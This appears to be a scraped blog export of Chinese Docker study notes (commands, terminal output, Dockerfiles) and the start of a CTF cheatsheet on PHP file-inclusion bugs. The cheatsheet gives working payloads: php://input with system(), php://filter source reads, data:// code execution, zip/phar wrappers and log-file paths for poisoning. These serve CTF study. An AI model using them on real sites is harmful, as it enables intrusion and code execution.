mysql@sha256:b3d1eff023f698cd433695c9506171f0d08a8f92a0c8063c1a4d9db9a55808dfDeleted: sha256:a70d36bc331a13d297f882d3d63137d24b804f29fa67158c40ad91d5050c39c5Deleted: sha256:50c77bf7bcddd1f1d97789d80ac2404eec22c860c104e858620d2a2e321f0ef7Deleted: sha256:14244329b83dfc8982398ee4104a548385652d2bffb957798ff86a419013efd6Deleted: sha256:6d990477f90af28473eb601a9bca22253f6381e053c5a8edda0a4f027e124a3cDeleted: sha256:ee0449796df204071589162fc16f8d65586312a40c68d1ba156c93c56f5e5ce8Deleted: sha256:d08533f1e2acc40ad561a46fc6a76b54c739e6b24f077c183c5709e0a6885312Deleted: sha256:4f9d91a4728e833d1062fb65a792f06e22e425f63824f260c8b5a64b776ddc38Deleted: sha256:20bf4c759d1b0d0e6286d2145453af4e0e1b7ba3d4efa3b8bce46817ad4109deDeleted: sha256:a9371bbdf16ac95cc72555c6ad42f79b9f03a82d964fe89d52bdc5f335a5f42aDeleted: sha256:5b02130e449d94f51e8ff6e5f7d24802246198749ed9eb064631e63833cd8f1dDeleted: sha256:ab74465b38bc1acb16c23091df32c5b7033ed55783386cb57acae8efff9f4b37Untagged: tomcat:latestUntagged: tomcat:9.0Untagged: tomcat@sha256:94cc18203335e400dbafcd0633f33c53663b1c1012a13bcad58cced9cd9d1305Deleted: sha256:040bdb29ab375db2a8de090070dcbee19d43f609385a934c3f2b423e515f57bbDeleted: sha256:03ac467e286d36301dba7daaec530f481074197d22d41bd48a32e5a2e3069573Deleted: sha256:c56c3d4e36aac2060fdb29c95baf4b4d6916fe9a454751b77b8d89f27dd8dda4Deleted: sha256:0f3911a87064866cd2aa7fd863afc1e02bdfa4856afa351e871f0e6a48cfd52bDeleted: sha256:7891c5716382337382836e0af1ea998bf77c1eed9c8e806c7aac5f489952f4baDeleted: sha256:56dee2fc4110951264d4b134b303920c633aabbbb0264dc218518b3547320de2Deleted: sha256:cd253bbc5a1ce457359958f4905b53a3f6f0ac167ba5065f68385600fdbae99eDeleted: sha256:03b0292dbc6978fe1077f948ac07472a8cac23fb4c3cf92c76f5eb62891e3d5aDeleted: sha256:19f2a825ed46bbf16a06d9d5185a0ac68196217f302e760abb4cbc3178b14cc1Deleted: sha256:b4f0436e967b6b9b021d3ed900a5422da6d8fe8c17c51c7d7e4f9c105812f868Deleted: sha256:4762552ad7d851a9901571428078281985074e5ddb806979dd7ad24748db4ca0Untagged: nginx:latestUntagged: nginx@sha256:10b8cc432d56da8b61b070f4c7d2543a9ed17c2b23010b43af434fd40e2ca4aaDeleted: sha256:f6d0b4767a6c466c178bf718f99bea0d3742b26679081e52dbf8e0c7c4c42d74Deleted: sha256:4dfe71c4470c5920135f00af483556b09911b72547113512d36dc29bfc5f7445Deleted: sha256:3c90a0917c79b758d74b7040f62d17a7680cd14077f734330b1994a2985283b8Deleted: sha256:a1c538085c6f891424160d8db120ea093d4dda393e94cd4713e3fff3c82299b5Deleted: sha256:a3ee2510dcf02c980d7aff635909612006fd1662084d6225e52e769b984abeb5Deleted: sha256:cb42413394c4059335228c137fe884ff3ab8946a014014309676c25e3ac86864Untagged: nginx:1.18.0-alpineUntagged: nginx@sha256:7ae8e5c3080f6012f8dc719e2308e60e015fcfa281c3b12bf95614bd8b6911d6Deleted: sha256:f2343e2e25078726ff14f81e5f530e390ac147eef63a4828db6cc2c4155ff88fDeleted: sha256:c584818973ae5022b23a6b851d2c9119b32458154a9cab36181b80edcea176cfDeleted: sha256:b6efb22fdcfd525d19e21844e59a80ca9e4b194b581961bc080977d5f69ab59aDeleted: sha256:f1d9a117248f08168772190c89436e26770693b6d5a2c61425ca905befabe858Deleted: sha256:2c1427c3e3c7078294a8cf7a4c7cdc556c83b3492ffb11149ecf0d1f7d96278bDeleted: sha256:0fcbbeeeb0d7fc5c06362d7a6717b999e605574c7210eff4f7418f6e9be9fbfeUntagged: centos:latestUntagged: centos@sha256:5528e8b1b1719d34604c87e11dcd1c0a20bedf46e83b5632cdeac91b8c04efc1Deleted: sha256:300e315adb2f96afe5f0b2780b87f28ae95231fe3bdd1e16b9ba606307728f55Deleted: sha256:2653d992f4ef2bfd27f94db643815aa567240c37732cae1405ad1c1309ee9859Error response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: mysqlError: No such image: 5.7Error: No such image: 6Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: 9.0Error: No such image: 7Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: tomcatError: No such image: latestError: No such image: 040bdb29ab37Error: No such image: 7Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: latestError: No such image: f6d0b4767a6cError: No such image: 7Error: No such image: weeksError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: nginxError: No such image: 1.18.0-alpineError: No such image: 2Error: No such image: monthsError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercaseError: No such image: latestError: No such image: 300e315adb2fError: No such image: 2Error: No such image: monthsError: No such image: agoError response from daemon: invalid reference format: repository name must be lowercase\n\n容器命令docker run [可选参数] [image/镜像名]\n新建容器并启动\n# 参数\n–name=”Name”        容器名字\n-d                                后台方式运行\n-it                                使用交互方式运行，进入容器查看内容\n-p                                指定容器端口 -p 8080:8080\n-p    ip:主机端口：容器端口\n-p    主机端口：容器端口（常用）\n-p    容器端口\n容器端口\n-P                                 随机指定端口\nyangfan@yangfan-virtual-machine:~$ sudo docker run --name nginx2 -d -p 3355:80 nginxd5b419eeaa4675888040fe56963c692ac08ab18449abcc0554456a5eff5cb4eeyangfan@yangfan-virtual-machine:~$ sudo docker psCONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                  NAMESd5b419eeaa46   nginx     \"/docker-entrypoint.…\"   9 seconds ago   Up 8 seconds   0.0.0.0:3355-&gt;80/tcp   nginx2\n\n​                 \n# 测试 启动并进入容器\ndocker run -it centos /bin/bash    \n退出 exit\ndocker ps\n列出当前正在运行的容器\nyangfan@yangfan-virtual-machine:~$ sudo docker psCONTAINER ID   IMAGE     COMMAND       CREATED       STATUS       PORTS     NAMES7c869b1bbcbc   centos    \"/bin/bash\"   2 hours ago   Up 2 hours             fervent_chatelet\n\n参数\n-a            列出所有的运行的容器+出历史运行过的容器\n退出容器\nexit        直接容器停止并退出\nctrl + P + Q    容器不停止退出\n删除容器\ndocker rm 容器id        删除指定的容器，不能删除正在运行的容器\ndocker rm -f $(docker ps -qa)                删除所有容器\n启动和停止容器的操作\ndocker start 容器id            启动容器\ndocker restart 容器id          重启容器\ndocker stop 容器id              停止当前正在运行的容器\ndocker kill 容器id                强制停止当前容器\n常用其他命令后台启动容器的坑\ndocker容器使用后台运行，就必须要有一个前台进程，docker发现没有应用，就会自动停止\nnginx，容器启动后，发现自己没有提供服务，就会立刻停止\n查看日志docker logs -f -t –tail 行数 容器\n查看容器中进程信息docker top 容器id\n查看镜像的元数据docker inspect 容器id\n进入当前正在运行的容器docker exec -it 容器id bashshell\ndocker attach 容器id\n区别\ndocker exec     进入容器后开启一个新的终端，可以在里面操作\ndocker attach    进入容器正在执行的终端，不会启动新的进程\n从容器内拷贝文件到主机上docker cp 容器id:容器内路径 目的的主机路径\nDocker实战操作docker 安装 nginx搜索docker search nginx\nyangfan@yangfan-virtual-machine:~$ sudo docker search nginx[sudo] yangfan 的密码： NAME                               DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDnginx                              Official build of Nginx.                        14519     [OK]       jwilder/nginx-proxy                Automated Nginx reverse proxy for docker con…   1973                 [OK]richarvey/nginx-php-fpm            Container running Nginx + PHP-FPM capable of…   809                  [OK]jc21/nginx-proxy-manager           Docker container for managing Nginx proxy ho…   157                  linuxserver/nginx                  An Nginx container, brought to you by LinuxS…   141                  tiangolo/nginx-rtmp                Docker image with Nginx using the nginx-rtmp…   115                  [OK]jlesage/nginx-proxy-manager        Docker container for Nginx Proxy Manager        98                   [OK]bitnami/nginx                      Bitnami nginx Docker Image                      94                   [OK]alfg/nginx-rtmp                    NGINX, nginx-rtmp-module and FFmpeg from sou…   89                   [OK]nginxdemos/hello                   NGINX webserver that serves a simple page co…   66                   [OK]nginx/nginx-ingress                NGINX Ingress Controller for Kubernetes         49                   privatebin/nginx-fpm-alpine        PrivateBin running on an Nginx, php-fpm &amp; Al…   47                   [OK]nginxinc/nginx-unprivileged        Unprivileged NGINX Dockerfiles                  31                   staticfloat/nginx-certbot          Opinionated setup for automatic TLS certs lo…   19                   [OK]schmunk42/nginx-redirect           A very simple container to redirect HTTP tra…   19                   [OK]nginx/nginx-prometheus-exporter    NGINX Prometheus Exporter                       16                   centos/nginx-112-centos7           Platform for running nginx 1.12 or building …   15                   centos/nginx-18-centos7            Platform for running nginx 1.8 or building n…   13                   bitwarden/nginx                    The Bitwarden nginx web server acting as a r…   9                    flashspys/nginx-static             Super Lightweight Nginx Image                   9                    [OK]bitnami/nginx-ingress-controller   Bitnami Docker Image for NGINX Ingress Contr…   8                    [OK]mailu/nginx                        Mailu nginx frontend                            8                    [OK]navidonskis/nginx-php5.6           Docker nginx + php5.6 on Ubuntu                 7                    [OK]ansibleplaybookbundle/nginx-apb    An APB to deploy NGINX                          2                    [OK]wodby/nginx                        Generic nginx                                   1                    [OK]\n\n下载nginxyangfan@yangfan-virtual-machine:~$ sudo docker pull nginx:1.18.0-alpine1.18.0-alpine: Pulling from library/nginx0a6724ff3fcd: Pull complete 1d7c87af3754: Pull complete 9668ffa91d19: Pull complete e81a2f5037c1: Pull complete 991b5ddb4d9e: Pull complete Digest: sha256:7ae8e5c3080f6012f8dc719e2308e60e015fcfa281c3b12bf95614bd8b6911d6Status: Downloaded newer image for nginx:1.18.0-alpinedocker.io/library/nginx:1.18.0-alpine\n\n运行容器yangfan@yangfan-virtual-machine:~$ sudo docker run --name nginx1 -d -p 3344:80 nginxUnable to find image 'nginx:latest' locallylatest: Pulling from library/nginxa076a628af6f: Already exists 0732ab25fa22: Pull complete d7f36f6fe38f: Pull complete f72584a26f32: Pull complete 7125e4df9063: Pull complete Digest: sha256:10b8cc432d56da8b61b070f4c7d2543a9ed17c2b23010b43af434fd40e2ca4aaStatus: Downloaded newer image for nginx:latest2cd5726333e7eadab428a788ad440c16d00af2aecc1010e4ead0b7878aa899cayangfan@yangfan-virtual-machine:~$ sudo docker psCONTAINER ID   IMAGE     COMMAND                  CREATED         STATUS         PORTS                  NAMES2cd5726333e7   nginx     \"/docker-entrypoint.…\"   9 seconds ago   Up 8 seconds   0.0.0.0:3344-&gt;80/tcp\n\n进入容器查看配置文件yangfan@yangfan-virtual-machine:~$ sudo docker exec -it 2cd5726333e7 /bin/bashroot@2cd5726333e7:/# lsbin   dev\t\t   docker-entrypoint.sh  home  lib64  mnt  proc  run   srv  tmp  varboot  docker-entrypoint.d  etc\t\t\t lib   media  opt  root  sbin  sys  usrroot@2cd5726333e7:/# whoamirootroot@2cd5726333e7:/# whwhereis  which    while    who      whoami   root@2cd5726333e7:/# whereis nginxnginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginxroot@2cd5726333e7:/# cd /etc/nginx/\n\n安装tomcat官方的使用方式\ndocker run -it –rm tomcat:90\n–rm        一般用来测试，用完就删除\n下载镜像\nyangfan@yangfan-virtual-machine:~$ sudo docker pull tomcatUsing default tag: latestlatest: Pulling from library/tomcatb9a857cbf04d: Pull complete d557ee20540b: Pull complete 3b9ca4f00c2e: Pull complete 667fd949ed93: Pull complete 661d3b55f657: Pull complete 511ef4338a0b: Pull complete a56db448fefe: Pull complete 00612a99c7dc: Pull complete 326f9601c512: Pull complete c547db74f1e1: Pull complete Digest: sha256:94cc18203335e400dbafcd0633f33c53663b1c1012a13bcad58cced9cd9d1305Status: Downloaded newer image for tomcat:latestdocker.io/library/tomcat:latest\n\n运行镜像\nyangfan@yangfan-virtual-machine:~$ sudo docker imagesREPOSITORY   TAG             IMAGE ID       CREATED        SIZEmysql        5.7             a70d36bc331a   6 weeks ago    449MBtomcat       9.0             040bdb29ab37   7 weeks ago    649MBtomcat       latest          040bdb29ab37   7 weeks ago    649MBnginx        latest          f6d0b4767a6c   7 weeks ago    133MBnginx        1.18.0-alpine   f2343e2e2507   2 months ago   21.9MBcentos       latest          300e315adb2f   2 months ago   209MByangfan@yangfan-virtual-machine:~$ sudo docker run -d -p 3344:8080 --name tomcat1 tomcat b90a6472737fe5d319b4afad7d360a3e6394dd08fb0991bc27751c99e30b1712yangfan@yangfan-virtual-machine:~$ sudo docker ps CONTAINER ID   IMAGE     COMMAND             CREATED              STATUS              PORTS                    NAMESb90a6472737f   tomcat    \"catalina.sh run\"   About a minute ago   Up About a minute   0.0.0.0:3344-&gt;8080/tcp   tomcat1\n\ndocker stats 容器id\n查看cpu状态\nCONTAINER ID   NAME      CPU %     MEM USAGE / LIMIT     MEM %     NET I/O           BLOCK I/O        PIDSeaee03688881   mysql02   0.08%     204.6MiB / 2.895GiB   6.90%     12.1kB / 20.3kB   26.7MB / 292MB   32\n\nCommit镜像docker commit 提交容器成为一个新的副本\ndocker commit -m=”提交的描述信息” -a=”作者” 容器id 目标镜像名[:TAG]\nfany@ubuntu18:~$ sudo docker commit -m=\"commit版centos\" -a=\"fany\" 1e7b39c3c2da fany/centos:2.0 sha256:7396d029926a4f5ba6b9f82e5172666ae63b60cd0b53fd9f607798052bd3a05bfany@ubuntu18:~$ sudo docker imagesREPOSITORY    TAG       IMAGE ID       CREATED         SIZEfany/centos   2.0       7396d029926a   5 seconds ago   209MBfany/centos   1.0       13da2d456cd9   38 hours ago    209MBmysql         5.7       a70d36bc331a   7 weeks ago     449MBcentos        latest    300e315adb2f   3 months ago    209MB\n\n容器数据卷使用数据卷docker run -it -v 主机目录：容器内目录 \n把主机目录挂载到容器目录中\n使用数据卷实战：安装mysql下载mysqldocker pull mysql\n\n运行mysql# 官方mysql运行测试命令docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag\n\ndocker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7# -d 后台运行-p 端口映射-v 挂载（就是docker主机和主机之间的文件相互同步）-e 添加配置--name 别名\n\n具名和匿名挂载# 匿名挂载-v 容器内路径docker run -d -P --name nginx01 -v /etc/nginx nginxfany@ubuntu18:~$ sudo docker run -d -P --name nginx01 -v /etc/nginx/ nginxUnable to find image 'nginx:latest' locallylatest: Pulling from library/nginxa076a628af6f: Already exists 0732ab25fa22: Pull complete d7f36f6fe38f: Pull complete f72584a26f32: Pull complete 7125e4df9063: Pull complete Digest: sha256:10b8cc432d56da8b61b070f4c7d2543a9ed17c2b23010b43af434fd40e2ca4aaStatus: Downloaded newer image for nginx:latest2156646a24e3b8515ad3cb295e3188a7f06d5da7d7d6d286e47e33a53fdff665# 查看所有的volume的情况docker volume lsfany@ubuntu18:~$ sudo docker volume lsDRIVER    VOLUME NAMElocal     1aace1413a58fe48b59552be0e13f258fc2625389c358dc63f0fa61023af7264local     2e6cf97c31fa74eb56fbecf7467b0eeebc85286c2d0b73324f7431f3e339a4aclocal     5ac0f89b61aad729335646a84d938d45072bebaadb5446e638311d8b78f1ae09local     6eb06715d487effeab344c9a335940e522a3c95c89dce0363b93aa30b45d320flocal     9ce9dca7966653ba788bd8c7a79444d3a7fd533f89e3d97da0bb2eabf5d20328local     9d1e8bfccadc28cd3048078e743e139183eb1fee78759e3bbb4170394e5d473flocal     9d8414a8ce53ef619a12bde9abfadbc3937565d566dd63e1d72d61ba3771a48blocal     44a91fa46dd5003a31c9123b8bbe1d43deb4933a6503c84ce17b11eaf0d5b769local     90d2f411f4eb4d6bd903f4ceac1d6ab57ba557b08db220414aa28bda734da62flocal     2906a33e43e822a758130a9a8ae37c2dc31cb9aa1dde45969a0a43819cc48c20local     3871f7c9892d84ce47c536a3ad810b3dcea7f3aecb9ce0c8ae66490c3f84ebaflocal     6058f80c65d9dd81f29975267e5f1eadee371c3ae2673828452757502550a19flocal     216203260f3961bd642a69622c97b9abf6b87172c28ee20048b4fae26c3e806alocal     a52876a9d6f8a6556d3bf3835c0d92a0bc3853ace46843bd685241033ab14a56local     b60310b05c6bfa2a9ed0619264f0c8db7d5beab25c8ad132d981507c5f8b2180local     d6fd04629f90fa33f8ae877cfcf9a2ae55e39c0f6f71c9b58c0692c435aeb004local     e1ea3b10c4e43b47452a9183537115a67ebac455a17530ed3df18fda2c1f5cb9local     f9fff3462e30f18f4f85d4c0d9d50ee02f5b0909ed22b79d7e6b9e638b386408# 这里发现，这种就是匿名挂载，我们在 -v 只写了容器内的路径，没有写容器外的路径sudo# 具名挂载docker run -d -P --name nginx02 -V juming-nginx:/etc/nginx nginxdocker volume lsfany@ubuntu18:~$ sudo docker volume lsDRIVER    VOLUME NAMElocal     1aace1413a58fe48b59552be0e13f258fc2625389c358dc63f0fa61023af7264local     2e6cf97c31fa74eb56fbecf7467b0eeebc85286c2d0b73324f7431f3e339a4aclocal     5ac0f89b61aad729335646a84d938d45072bebaadb5446e638311d8b78f1ae09local     6eb06715d487effeab344c9a335940e522a3c95c89dce0363b93aa30b45d320flocal     9ce9dca7966653ba788bd8c7a79444d3a7fd533f89e3d97da0bb2eabf5d20328local     9d1e8bfccadc28cd3048078e743e139183eb1fee78759e3bbb4170394e5d473flocal     9d8414a8ce53ef619a12bde9abfadbc3937565d566dd63e1d72d61ba3771a48blocal     44a91fa46dd5003a31c9123b8bbe1d43deb4933a6503c84ce17b11eaf0d5b769local     90d2f411f4eb4d6bd903f4ceac1d6ab57ba557b08db220414aa28bda734da62flocal     2906a33e43e822a758130a9a8ae37c2dc31cb9aa1dde45969a0a43819cc48c20local     3871f7c9892d84ce47c536a3ad810b3dcea7f3aecb9ce0c8ae66490c3f84ebaflocal     6058f80c65d9dd81f29975267e5f1eadee371c3ae2673828452757502550a19flocal     216203260f3961bd642a69622c97b9abf6b87172c28ee20048b4fae26c3e806alocal     a52876a9d6f8a6556d3bf3835c0d92a0bc3853ace46843bd685241033ab14a56local     b60310b05c6bfa2a9ed0619264f0c8db7d5beab25c8ad132d981507c5f8b2180local     d6fd04629f90fa33f8ae877cfcf9a2ae55e39c0f6f71c9b58c0692c435aeb004local     e1ea3b10c4e43b47452a9183537115a67ebac455a17530ed3df18fda2c1f5cb9local     f9fff3462e30f18f4f85d4c0d9d50ee02f5b0909ed22b79d7e6b9e638b386408local     juming-nginx\n\n所有的docker容器内的卷，没有指定目录的情况下都是在 /var/lib/docker/volumes/xxx/_data\n我们通过具名挂载可以方便的找到我们的一个卷，大多数情况在使用具名挂载\n# 区分匿名挂载/具名挂载还是指定路径挂载-v 容器内路径 # 匿名挂载-v 卷名:容器内路径 # 具名挂载-v /宿主机路径:容器内路径 # 指定路径挂载\n\n扩展：\n-v /宿主机路径:容器内路径 \n# 通过 -V 容器内路径：ro rw 改变读写权限ro\treadonly # 只读rw\treadwrite # 可读可写# 一旦这个设置了容器权限 容器对我们挂载出来的内容就有限定了docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:ro nginxdocker run -d -P --name nginx02 -v juming-nginx:/etc/nginx:rw nginx# ro 只要看到ro就说明这个路径只能通过宿主机来操作，容器内部都无法操作\n\n初始Dockerfiledockerfile 就是用来构建 docker镜像的构建文件，命令脚本\n通过这个脚本可以生成镜像，镜像是一层一层的，脚本一个个的命令，每个命令都是一层\n# 创建一个dockerfile文件 名字可以随机 建议dockerfile# 文件中的内容 指令（大写） 参数FROM centosVOLUME [&apos;volume01&apos;, &apos;volume02&apos;]CMD echo &quot;-----end-----&quot;CMD /bin/bash# 这里的每个命令，都是镜像的一层\n\n执行\ndocker build -f /home/dockerfile1 -t 作者名/镜像名：版本 .\n\nfany@ubuntu18:~/docker/DockerFile$ sudo docker build -f /home/fany/docker/DockerFile/dockerfile -t fany/centos:1.0 .Sending build context to Docker daemon  2.048kBStep 1/4 : FROM centos ---&gt; 300e315adb2fStep 2/4 : VOLUME ['volume01', 'volume02'] ---&gt; Running in ac6ee9ac88e2Removing intermediate container ac6ee9ac88e2 ---&gt; 28fabf1af5a9Step 3/4 : CMD echo \"----end----\" ---&gt; Running in 107be8d1d71aRemoving intermediate container 107be8d1d71a ---&gt; 246ba60efd5bStep 4/4 : CMD /bin/bash ---&gt; Running in d94e1416d4b9Removing intermediate container d94e1416d4b9 ---&gt; 13da2d456cd9Successfully built 13da2d456cd9Successfully tagged fany/centos:1.0\n\n数据卷容器docker run -it –name docker01 –volumes-from docker01 作者名/镜像名：版本 \n通过以上的方式我们可以实现容器间的数据共享\n任何一个容器被删除，共享的数据不会丢失\n多个mysql实现数据共享\ndocker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7fany@ubuntu18:~$ sudo docker run -d -p 3310:3306 -v /etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 mysql:5.7 eaee03688881f1c55d76642cf83518d862fe6ea5239d32ac7048628cfb44778adocker run -d -p 3310:3306 -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from mysql01 mysql:5.7# 测试结果fany@ubuntu18:~$ sudo docker exec -it eaee03688881 /bin/bashroot@eaee03688881:/# cd /var/lib/mysqlroot@eaee03688881:/var/lib/mysql# lsauto.cnf    client-cert.pem  ib_logfile0  ibtmp1\t      private_key.pem  server-key.pemca-key.pem  client-key.pem   ib_logfile1  mysql\t\t      public_key.pem   sysca.pem\t    ib_buffer_pool   ibdata1\t  performance_schema  server-cert.pem  testfany@ubuntu18:~$ sudo docker start a3a15fbd16a3a3a15fbd16a3fany@ubuntu18:~$ sudo docker exec -it a3a15fbd16a3 /bin/bashroot@a3a15fbd16a3:/# cd /var/lib/mysqlroot@a3a15fbd16a3:/var/lib/mysql# lsauto.cnf    client-cert.pem  ib_logfile0  ibtmp1\t      private_key.pem  server-key.pemca-key.pem  client-key.pem   ib_logfile1  mysql\t\t      public_key.pem   sysca.pem\t    ib_buffer_pool   ibdata1\t  performance_schema  server-cert.pem  test# 在eaee03688881容器中新建了test数据库  a3a15fbd16a3 也同步了test数据库\n\n结论：\n容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为止。\n但是一旦持久化到了本地，这个时候，本地的数据是不会删除的。\nDockerFiledockerfile介绍dockerfile构建过程dockerfile的指令FROM\t# 基础镜像，一切从这里开始构建MEINTAINER\t# 镜像是谁写的， 姓名+邮箱RUN\t\t# 镜像构建的时候需要运行的命令ADD\t\t# 步骤：tomcat镜像，这个tomcat压缩包 添加内容COPY\t# 类似ADD，将lsWORKDIR\t# 镜像的工作目录VOLUME\t# 挂载的目录EXPOST\t# 保留端口配置yumCMD\t\t# 指定容器启动的时候需要运行的命令 替换ENTRYPIOINT\t# 指定这个容器启动的时候要运行的命令\t追加ONBUILE\t# 当构建一个被继承 DockerFile 这个时候就会运行 ONBUILD的指令，触发指令。ENV\t\t# 构建的时候设置环境变量\n\n实战测试：centos\n创建一个自己的centos\n\n# 1 编写DockerFile配置文件FROM centosMAINTAINER\tfany&lt;483813121@qq.com&gt;ENV MYPATH /usr/localWORKDIR $MYPATHRUN yum -y install vim RUN yum -y install net-toolsEXPOSE 80CMD echo $MYPATHCMD\techo \"----end----\"CMD /bin/bash# 2、通过这个文件 构建镜像# 命令 docker build -f dockerfile文件路径 -t 镜像名：[tag] .构建成功后显示Successfully built 镜像idSuccessfully tagged 镜像名:tag# 3、运行测试fany@ubuntu18:~/docker/DockerFile$ sudo docker run --name centos03 -it 2eee339e854a[root@28ffb5be051d local]# lsbin  etc  games  include  lib  lib64  libexec  sbin  share  src\n\n列出本地进行的变更历史镜像命令\ndocker history 镜像id\nfany@ubuntu18:~/docker/DockerFile$ sudo docker history 2eee339e854aIMAGE          CREATED         CREATED BY                                      SIZE      COMMENT2eee339e854a   7 minutes ago   /bin/sh -c #(nop)  CMD [\"/bin/sh\" \"-c\" \"/bin…   0B        328c5590083f   7 minutes ago   /bin/sh -c #(nop)  CMD [\"/bin/sh\" \"-c\" \"echo…   0B        61c489975a32   7 minutes ago   /bin/sh -c #(nop)  CMD [\"/bin/sh\" \"-c\" \"echo…   0B        4775afd52615   7 minutes ago   /bin/sh -c #(nop)  EXPOSE 80                    0B        2d4e54be3fdd   7 minutes ago   /bin/sh -c yum -y install net-tools             23.3MB    2210b82a2fd3   7 minutes ago   /bin/sh -c yum -y install vim                   58MB      8ad9663738ee   8 minutes ago   /bin/sh -c #(nop) WORKDIR /usr/local            0B        9e5baf54c101   8 minutes ago   /bin/sh -c #(nop)  ENV MYPATH=/usr/local        0B        7ca038e36aec   8 minutes ago   /bin/sh -c #(nop)  MAINTAINER fany&lt;483813121…   0B        300e315adb2f   3 months ago    /bin/sh -c #(nop)  CMD [\"/bin/bash\"]            0B        &lt;missing&gt;      3 months ago    /bin/sh -c #(nop)  LABEL org.label-schema.sc…   0B        &lt;missing&gt;      3 months ago    /bin/sh -c #(nop) ADD file:bd7a2aed6ede423b7…   209MB\n\n\nCMD 和 ENTRYPOINT 区别\n\nCMD\t\t# 指定容器启动的时候需要运行的命令 替换ENTRYPIOINT\t# 指定这个容器启动的时候要运行的命令\t追加\n\n实战测试：Tomcat镜像1、准备镜像文件 tomcat压缩包，jdk的压缩包\n2、编写dockerfile文件，官方命名Dockerfile\nFROM centosMAINTAINER fany&lt;483813121@qq.com&gt;COPY readme.txt /usr/local/readme.txtADD jdk-8u11-linux-x64.tar.gz /usr/local/ADD apache-tomcat-9.0.22.tar.gz /usr/local/RUN yum -y install vimENV MYPATH /usr/localWORKDIR $MYPATHENV JAVA_HOME /usr/local/jdk1.80_11ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jarENV CATALINA_HOME /usr/local/apache-tomcat-9.0.22ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.22ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/binEXPOSE 8080CMD /usr/local/apache-tomcat-9.0.22/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.0.22/bin/logs/catalina.out\n\n3、构建镜像\n# docker build -f diytomcat\n\n4、启动镜像\n5、访问测试\n6、发布项目\n发布自己的镜像https://homenew.console.aliyun.com/home/dashboard/ProductAndService\n阿里云的容器镜像服务\nDocKer网络","categories":["Docker"],"tags":["docker学习"]},{"title":"CTF-Web【文件包含】漏洞做题姿势积累","url":"/2021/10/23/CTF-Web%E3%80%90%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF/","content":"前言\n本篇文章专门用于记录做文件包含类题目的做题姿势，会不断更新。\n\n\nLFI：Local File Inclusion，本地文件包含漏洞，大部分情况下遇到的文件包含漏洞都是LFI\nRFI：Remote File Inclusion，远程文件包含漏洞，要求allow_url_fopen=On(默认为On) ，规定是否允许从远程服务器或者网站检索数据；allow_url_include=On(php5.2之后默认为Off) ，规定是否允许include/require远程文件\n\nphp常见文件包含函数include()：遇到错误生成警告，继续执行脚本require()：遇到错误生成致命错误，脚本继续include_once()：如果文件已包含，则不再进行包含，一定程度避免错误require()_once()：如果文件已包含，则不再进行包含，一定程度避免错误fopen()，file_get_contents()等：文件读取函数\n\n文件包含漏洞的利用php伪协议php://input（allow_url_include=On）\n遇到file_get_contents()要想到用php://input绕过\n\n构造?file=php://inputpost data中输入：&lt;?php system(&apos;dir&apos;);?&gt;    //代码表示显示所有文件目录根据显示的文件目录直接进行访问（某txt或php文件），得到flag\n\nphp://filter\n可以使用的函数：readfile()、file()、file_get_contents()、include()\n\n?file=php://filter/read=convert.base64-encode/resource=index.php\n\ndata://\n要求allow_url_fopen=On，allow_url_include=On\n\n?file=data://text/plain,&lt;?php phpinfo()?&gt;    //执行phpinfo()?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=    //将命令进行base64加密，编码为“&lt;?php phpinfo()?&gt; ”的base64编码?file=data:text/plain,&lt;?php phpinfo()?&gt;    //去掉双斜杠?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n\nzip://\nzip:// 可以访问压缩包里面的文件。zip://中只能传入绝对路径；要用#分隔压缩包和压缩包里的内容，且#要用url编码%23代替\n\n?file=zip://D:\\file.zip%23flag.txt\n\n\nD:\\file.zip表示压缩包的绝对路径\n后跟%23分割压缩包和压缩包中要访问的文件名\n\nphar://\n类似zip://，相对路径和绝对路径都可以使用，不管后缀名是什么都会将文件当作压缩包解压\n\n?file=phar://D:\\file.zip\\flag.txt    //绝对路径?file=phar://file.zip\\flag.txt    //相对路径\n\n包含日志文件日志和配置文件默认存放路径apache+Linux日志默认路径 /etc/httpd/logs/access_log/var/log/httpd/access_log\n\napache+win2003日志默认路径 D:\\xampp\\apache\\logs\\access.logD:\\xampp\\apache\\logs\\error.log\n\nIIS6.0+win2003默认日志文件 C:\\WINDOWS\\system32\\Logfiles\n\nIIS7.0+win2003 默认日志文件  %SystemDrive%\\inetpub\\logs\\LogFiles\n\nnginx 日志文件 用户安装目录logs目录下（/usr/local/nginx/logs） /var/log/nginx/access.log/var/log/nginx/error.log\n\napache+linux 默认配置文件 